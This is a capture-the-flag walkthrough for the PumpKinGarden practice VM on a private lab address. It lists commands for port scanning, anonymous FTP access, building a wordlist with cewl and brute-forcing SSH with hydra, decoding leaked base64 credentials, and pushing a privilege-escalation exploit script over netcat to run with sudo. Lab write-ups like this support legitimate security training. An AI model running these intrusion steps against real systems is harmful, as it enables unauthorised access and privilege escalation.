# Penetration Testing : PumpKinGarden Walkthrough



### 1. Port Scanning
Start by scanning the network to identify open ports and services:
```bash
nmap -A -vv -p- 192.168.56.101
```
This identifies FTP, HTTP, and SSH services running on ports 21, 1515, and 3535, respectively.

### 2. Gaining Initial Access

#### FTP Access
Since anonymous FTP login is enabled:
```bash
ftp 192.168.56.101
Username: anonymous
Password: [any password]
FTP> ls -a
FTP> get note.txt
quit
cat note.txt
```

#### HTTP Access
The HTTP server on port 1515 provides crucial information for further steps.
- Use `cewl` to generate a wordlist for brute-forcing SSH credentials:
  ```bash
  cewl http://192.168.56.101:1515 > wordlist.txt
  ```

#### SSH Access
Brute-force SSH login for user 'jack' using hydra:
```bash
hydra -l jack -P wordlist.txt ssh://192.168.56.101 -s 3535
ssh jack@192.168.56.101 -p 3535
Password: PumpkinGarden
ls -a
cat note.txt
```

### 3. Privilege Escalation

#### Discovering More Credentials
- Decode Base64-encoded credentials and login as 'scarecrow':
  ```bash
  echo 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
  ssh scarecrow@192.168.56.101 -p 3535
  Password: 5Qn@$y
  ```

#### Transferring and Executing Scripts
Transfer and execute an exploit script using netcat:
```bash
# On target
nc -lp 1337 > /home/scarecrow/38362.sh

# From local terminal
nc -w 3 192.168.56.101 1337 < 38362.sh

# Change permissions and run the exploit
chmod +777 38362.sh myfile.txt
sudo /home/scarecrow/38362.sh myfile.txt
```

### 4. Capture the Flag
Extract sensitive data from the target:
```bash
cd ~
ls -a
cat PumpkinGarden_Key
echo 'Q29uZ3JhdHVsYXRpb25zIQ==' | base64 -d
```
